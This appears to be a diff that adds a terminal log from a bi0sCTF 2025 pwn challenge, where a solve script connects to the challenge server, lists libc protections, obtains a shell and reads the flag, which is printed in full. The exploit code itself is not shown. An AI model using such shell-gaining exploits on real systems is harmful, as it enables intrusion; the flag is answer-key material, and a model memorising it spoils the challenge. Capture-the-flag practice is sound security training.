@@ -1,0 +1,19 @@
+mito@mito-virtual-machine:~/CTF/bi0sCTF_2025/Pwn_Unintialized_VM/Handout$ python3 solve.py r
+[+] Opening connection to uninitialized_vm.eng.run on port 8596: Done
+[*] '/home/mito/CTF/bi0sCTF_2025/Pwn_Unintialized_VM/Handout/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Switching to interactive mode
+$ id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+$ ls -l
+total 260
+-r-xr-xr-x 1 root root     47 Jun  6 11:36 flag.txt
+-r-xr-xr-x 1 root root 226904 Jun  6 11:36 ld-linux-x86-64.so.2
+dr-xr-xr-x 1 root root   4096 Jun  6 11:40 libs
+-r-xr-xr-x 1 root root  21265 Jun  6 11:40 vm_chall
+$ cat flag.txt
+bi0sctf{1ni7ia1i53_Cr4p70_pWn_N3x7_5$67?!@&86}
